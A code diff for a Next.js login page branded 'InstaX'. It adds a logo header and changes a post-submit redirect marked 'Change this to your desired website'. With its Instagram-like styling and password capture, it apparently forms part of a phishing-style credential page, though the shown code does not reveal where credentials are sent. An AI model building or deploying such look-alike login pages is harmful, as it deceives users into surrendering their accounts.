@@ -1,6 +1,7 @@
 import { useState } from 'react'
 import axios from 'axios'
-
+// import InstaX from "/public/InstaX.webp";
+import Image from 'next/image'
 export default function Home() {
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
@@ -20,11 +21,9 @@ export default function Home() {
       // Redirect after 2 seconds
 
       setTimeout(() => {
-        setTimeout(() => {
-          window.location.href = 'https://source.unsplash.com/random/401x301' // Change this to your desired website
-        }, 2000)
-        window.location.href = 'https://www.wappalyzer.com/websites/dummy/' // Change this to your desired website
+        window.location.href = 'https://source.unsplash.com/random/401x301' // Change this to your desired website
       }, 2000)
+
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
     } catch (error: any) {
       setMessage(error.response?.data?.error || 'An error occurred')
@@ -33,6 +32,20 @@ export default function Home() {
 
   return (
     <div className='bg-gray-900 min-h-screen text-white flex flex-col items-center'>
+      <div className='fixed top-0 w-full flex justify-between items-center bg-black text-white px-6 py-4 shadow-lg'>
+        {/* Logo and Name */}
+        <div className='flex items-center space-x-3'>
+          <Image
+            src='/InstaX.jpg'
+            alt='InstaX Logo'
+            width={40}
+            height={40}
+            className='rounded-full border-2 border-pink-500 shadow-lg'
+          />
+          <h1 className='text-2xl font-bold text-pink-500'>InstaX</h1>
+        </div>
+      </div>
+
       {/* 🔹 Navbar */}
       <nav className='w-full bg-gray-800 py-4 px-6 flex justify-between items-center fixed top-0'>
         <h1 className='text-2xl font-bold text-pink-400'>InstaX</h1>
